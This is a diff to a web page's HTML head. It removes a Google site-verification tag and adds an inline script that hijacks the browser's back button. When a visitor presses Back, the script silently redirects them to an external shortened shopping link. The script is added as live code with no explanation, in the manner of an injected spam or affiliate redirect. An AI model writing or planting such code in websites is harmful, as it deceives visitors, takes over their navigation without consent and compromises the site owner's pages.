@@ -27,7 +27,20 @@
 <link rel="icon" type="image/png" href="/logo.png">
 <link rel="icon" type="image/x-icon" sizes="16x16 32x32" href="/favicon.ico">
 <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="google-site-verification" content="3KleKPN1bBNn4mHdcHSuCEJbw_d3XU2gr6qi56RCnJI" />
+    <script type='text/javascript'>
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://shope.ee/7ezCdOP6Ir");
+    },0);
+  }
+}, false);
+}(window, location));
+</script>
 
 
 <script type="application/ld+json">
